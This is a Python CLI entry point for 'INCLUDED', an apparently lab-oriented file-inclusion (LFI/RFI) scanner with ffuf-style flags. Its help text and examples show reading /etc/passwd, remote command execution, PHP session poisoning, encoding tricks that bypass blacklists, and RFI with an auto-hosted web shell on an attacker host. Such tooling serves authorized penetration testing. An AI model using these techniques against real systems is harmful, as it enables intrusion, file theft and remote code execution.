"""INCLUDED — CLI entry point. ffuf/nmap-style flags.

Examples:
  included -w "http://host/index.php?language=INCLUDE"
  included -w "http://host/index.php?language=INCLUDE" -f /etc/passwd -v
  included -w "http://host/?p=INCLUDE" --profile rce --cmd "id" -b PHPSESSID=abc
  included -w "http://host/img.php?p=INCLUDE" -fs 0 -mc 200 -o out.json -of json
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys

from . import __version__
from .banner import render
from .config import Config, OSHint, Encoding, MatchFilter
from .detection import Finding
from .engine import Engine
from .http_client import build_request
from .modules import REGISTRY, GROUPS


def _parse_kv(pairs: list[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for p in pairs:
        if ":" in p:
            k, v = p.split(":", 1)
        elif "=" in p:
            k, v = p.split("=", 1)
        else:
            raise argparse.ArgumentTypeError(f"bad format: {p}")
        out[k.strip()] = v.strip()
    return out


def _int_set(val: str | None) -> set[int] | None:
    if not val:
        return None
    return {int(x) for x in val.split(",") if x.strip()}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="included",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="INCLUDED — modular File Inclusion (LFI/RFI) scanner. "
                    "For authorized targets only.",
        epilog="""\
The INCLUDE marker in the URL marks the injection point, e.g.
  -w "http://host/?page=INCLUDE"

examples:
  # basic scan, all modules, default wordlist
  included -w "http://host/index.php?language=INCLUDE"

  # target one specific file, verbose
  included -w "http://host/?p=INCLUDE" -f /etc/passwd -v

  # RCE only, with a command; a PHPSESSID cookie also enables session poisoning
  included -w "http://host/?p=INCLUDE" --profile rce --cmd "id" -b PHPSESSID=abc

  # blacklist bypass: filter blocks literal '.' / '/' after one decode --
  # -e double (or the default -e all) hides them behind a second encoding pass
  included -w "http://host/contact.php?region=INCLUDE" -f /etc/passwd -e double

  # noise filtering by response size, like ffuf -fs, output to JSON
  included -w "http://host/img.php?p=INCLUDE" -fs 1234 -o out.json -of json

  # external wordlist, e.g. SecLists, instead of the bundled defaults
  included -w "http://host/?view=INCLUDE" -W /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1234

  # RFI with an auto-hosted web shell (needs a reachable --lhost)
  included -w "http://host/?view=INCLUDE" -m rfi --lhost 10.10.14.1 --lport 8000 --cmd id
""",
    )
    # --- target ---
    tgt = p.add_argument_group("target")
    tgt.add_argument("-w", "--url", required=True, metavar="URL",
                     help="target URL with the INCLUDE marker")
    tgt.add_argument("-p", "--param", metavar="NAME",
                     help="parameter to inject into (when the URL has no INCLUDE)")
    tgt.add_argument("-X", "--method", default="GET", metavar="M", help="HTTP method")
    tgt.add_argument("-d", "--data", metavar="BODY", help="POST body (may contain INCLUDE)")

    # --- what to read ---
    rd = p.add_argument_group("read target")
    rd.add_argument("-f", "--file", metavar="PATH",
                    help="specific file/path to test (targeted)")
    rd.add_argument("-W", "--wordlist", metavar="FILE",
                    help="list of target files (one per line)")

    # --- session ---
    ses = p.add_argument_group("session")
    ses.add_argument("-H", "--header", action="append", default=[], metavar="'K: V'",
                     help="header (repeatable)")
    ses.add_argument("-b", "--cookie", action="append", default=[], metavar="'k=v'",
                     help="cookie (repeatable); PHPSESSID enables session poisoning")
    ses.add_argument("--proxy", metavar="URL", help="proxy, e.g. http://127.0.0.1:8080")

    # --- techniques ---
    tech = p.add_argument_group("techniques")
    tech.add_argument("-m", "--module", action="append", default=[], metavar="NAME",
                      help=f"module (repeatable): {', '.join(REGISTRY)}")
    tech.add_argument("--profile", choices=list(GROUPS), metavar="P",
                      help=f"preset group: {', '.join(GROUPS)}")
    tech.add_argument("--os", choices=[o.value for o in OSHint], default="auto",
                      help="OS hint")
    tech.add_argument("-e", "--encode", choices=[e.value for e in Encoding], default="all",
                      help="payload encoding variant")
    tech.add_argument("--depth", type=int, default=12, metavar="N", help="max ../ depth")

    # --- RCE / RFI ---
    rce = p.add_argument_group("RCE / RFI")
    rce.add_argument("--cmd", default="id", metavar="CMD",
                     help="command for web-shell/expect payloads (default: id)")
    rce.add_argument("--lhost", metavar="IP", help="your host for RFI")
    rce.add_argument("--lport", type=int, metavar="PORT", help="your port for RFI")

    # --- match/filter (ffuf-style) ---
    mf = p.add_argument_group("match / filter")
    mf.add_argument("-mc", metavar="CODES", help="show only these status codes (200,301)")
    mf.add_argument("-fc", metavar="CODES", help="hide these status codes (404,403)")
    mf.add_argument("-ms", metavar="SIZES", help="show only these sizes")
    mf.add_argument("-fs", metavar="SIZES", help="hide these sizes (strip noise: 0)")
    mf.add_argument("-mr", metavar="REGEX", help="show only responses matching this regex")
    mf.add_argument("-fr", metavar="REGEX", help="hide responses matching this regex")

    # --- performance / output ---
    io = p.add_argument_group("performance / output")
    io.add_argument("-t", "--threads", type=int, default=40, metavar="N",
                    help="concurrency")
    io.add_argument("--delay", type=float, default=0.0, metavar="S",
                    help="minimum seconds between request starts, across all threads "
                         "(rate limit for fragile/shared targets; default: none)")
    io.add_argument("--timeout", type=float, default=10.0, metavar="S")
    io.add_argument("-v", "--verbose", action="store_true", help="show every request")
    io.add_argument("-o", "--output", metavar="FILE", help="write results to file")
    io.add_argument("-of", "--output-format", choices=["text", "json"], default="text")
    io.add_argument("--all-hits", action="store_true",
                    help="disable dedup — show every confirmed finding, not just the first per file")
    io.add_argument("--no-verify", action="store_true",
                    help="skip the post-scan re-fetch that confirms each finding and captures full evidence")
    io.add_argument("--no-banner", action="store_true")
    io.add_argument("--version", action="version", version=f"included {__version__}")
    return p


def build_config(args) -> Config:
    modules = list(args.module)
    if args.profile:
        modules = GROUPS[args.profile]
    return Config(
        url=args.url, method=args.method.upper(), param=args.param, data=args.data,
        target_file=args.file, wordlist=args.wordlist,
        headers=_parse_kv(args.header), cookies=_parse_kv(args.cookie), proxy=args.proxy,
        os_hint=OSHint(args.os), encoding=Encoding(args.encode),
        max_depth=args.depth, concurrency=args.threads, timeout=args.timeout, delay=args.delay,
        verbose=args.verbose, cmd=args.cmd, lhost=args.lhost, lport=args.lport,
        modules=modules,
        mf=MatchFilter(
            match_codes=_int_set(args.mc), filter_codes=_int_set(args.fc),
            match_size=_int_set(args.ms), filter_size=_int_set(args.fs),
            match_regex=args.mr, filter_regex=args.fr,
        ),
        output=args.output, output_format=args.output_format, all_hits=args.all_hits,
        verify_findings=not args.no_verify,
    )


def _curl_repro(cfg: Config, f: Finding) -> str:
    """Build a curl command that reproduces this finding's request.

    Approximate for modules with a custom multi-step run() (input,
    log_poison, rfi) — their payload string alone doesn't capture the
    POST body swap / injected headers / hosted shell those use.
    """
    url, body = build_request(cfg, f.payload, encoding=f.encoding)
    parts = ["curl", "-s"]
    if cfg.method != "GET":
        parts += ["-X", cfg.method]
    for k, v in cfg.headers.items():
        parts += ["-H", f"'{k}: {v}'"]
    if cfg.cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cfg.cookies.items())
        parts += ["-b", f"'{cookie_str}'"]
    if body:
        parts += ["--data", f"'{body}'"]
    parts.append(f'"{url}"')
    return " ".join(parts)


def _report(results: dict, cfg: Config) -> int:
    total = 0
    lines = []
    reproducible: list[Finding] = []
    for module, findings in results.items():
        if not findings:
            if cfg.verbose:
                print(f"[ ] {module:<12} — no confirmed findings")
            continue
        for f in findings:
            total += 1
            print(f"[+] {module:<12} — {f.signal}  (HTTP {f.status}, {f.length}B)")
            print(f"      payload  : {f.payload}")
            print(f"      evidence : {f.evidence[:400]}")
            if f.full_body is not None:
                reproducible.append(f)
            lines.append({
                "module": module, "signal": f.signal, "payload": f.payload,
                "status": f.status, "length": f.length, "evidence": f.evidence,
            })
    print(f"\nSummary: {total} confirmed finding(s).")

    if reproducible:
        print("\nReproduce:")
        for f in reproducible:
            print(f"  {_curl_repro(cfg, f)}")
            print(f"  {f.full_body}")

    if cfg.output:
        with open(cfg.output, "w", encoding="utf-8") as fh:
            if cfg.output_format == "json":
                json.dump(lines, fh, ensure_ascii=False, indent=2)
            else:
                for l in lines:
                    fh.write(f"[{l['module']}] {l['signal']} :: {l['payload']}\n")
        print(f"[*] Written to {cfg.output} ({cfg.output_format})")
    return 0


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not args.no_banner:
        print(render(__version__))
    cfg = build_config(args)
    active = cfg.modules or list(REGISTRY)
    print(f"[*] Target : {cfg.target_summary()}")
    if cfg.verbose:
        print(f"[*] Modules: {', '.join(active)}")
        print(f"[*] Encode : {cfg.encoding.value} | depth: {cfg.max_depth} | threads: {cfg.concurrency}")
    try:
        results = asyncio.run(Engine(cfg).run())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        return 130
    return _report(results, cfg)


if __name__ == "__main__":
    raise SystemExit(main())
